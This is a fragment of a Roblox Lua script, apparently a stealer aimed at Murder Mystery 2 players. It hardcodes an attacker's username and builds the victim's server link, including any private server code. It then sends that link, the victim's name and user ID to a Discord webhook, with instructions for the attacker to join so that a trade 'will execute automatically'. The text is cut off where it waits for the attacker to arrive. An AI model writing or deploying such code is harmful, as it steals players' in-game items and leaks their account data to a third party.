--[[
    MM2 Ultimate Suite v7.1 - Username Locked
    - Only responds to YOUR username
    - No one else can trigger the trade
]]
...
local YOUR_USERNAME = "IIlllllIIIlllIIlII"  -- <-- Hardcoded to you

-- Generate the public server link
local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local serverLink = "https://www.roblox.com/games/" .. game.PlaceId

if game.PrivateServerId and game.PrivateServerId ~= "" then
    serverLink = serverLink .. "?privateServerLinkCode=" .. game.PrivateServerId
end

-- Send the server link to Discord
sendWebhook("🔗 **Public Server Link**", {
    title = "Click to Join",
    description = "**Victim:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n**Game:** " .. placeInfo.Name .. "\n**Server Link:** " .. serverLink .. "\n\n**Instructions:** Click the link to join the server. The trade will execute automatically when YOU arrive.",
    color = 0x00ff00
})

-- === WAIT FOR YOU TO JOIN (Username Locked) ===
